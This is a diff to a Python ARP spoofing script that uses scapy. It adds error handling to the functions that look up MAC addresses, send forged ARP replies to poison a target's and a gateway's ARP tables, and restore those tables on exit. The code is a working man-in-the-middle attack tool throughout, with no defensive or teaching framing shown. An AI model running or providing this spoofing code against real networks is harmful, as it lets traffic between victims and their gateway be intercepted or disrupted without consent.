@@ -1,4 +1,5 @@
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import time
 import scapy.all as scapy
@@ -18,30 +19,41 @@ def get_arguments():
 
 
 def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
+        return answered_list[0][1].hwsrc
+    except IndexError:
+        print("[-] Could not get MAC address for " + ip + ". Exiting.")
+        exit()
 
 
 def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
-    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
-                                  psrc=false_requester_ip)  # OP = 2 ARP response, 1 = ARP request,
-    scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
+    try:
+        target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
+                                      psrc=false_requester_ip)  # OP = 2 ARP response, 1 = ARP request,
+        scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
+    except:
+        print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
+        exit()
 
 
 def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester_mac):
-    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
-                                  psrc=false_requester_ip, hwsrc=false_requester_mac)
-    scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
+    try:
+        target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
+                                      psrc=false_requester_ip, hwsrc=false_requester_mac)
+        scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
+    except:
+        print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
+        exit()
 
 
 option = get_arguments()
 target_mac = get_mac(option.target_ip)
 gateway_mac = get_mac(option.gateway_ip)
-print("MAC of target: " + target_mac)
-print("MAC of gateway: " + gateway_mac)
+
 count = 0
 try:
     while True:
@@ -56,3 +68,5 @@ except KeyboardInterrupt:
     restore_arp_table(option.target_ip, target_mac, option.gateway_ip, gateway_mac)
     restore_arp_table(option.gateway_ip, gateway_mac, option.target_ip, target_mac)
     print("[+] ARP Tables Reset Successfully")
+
+
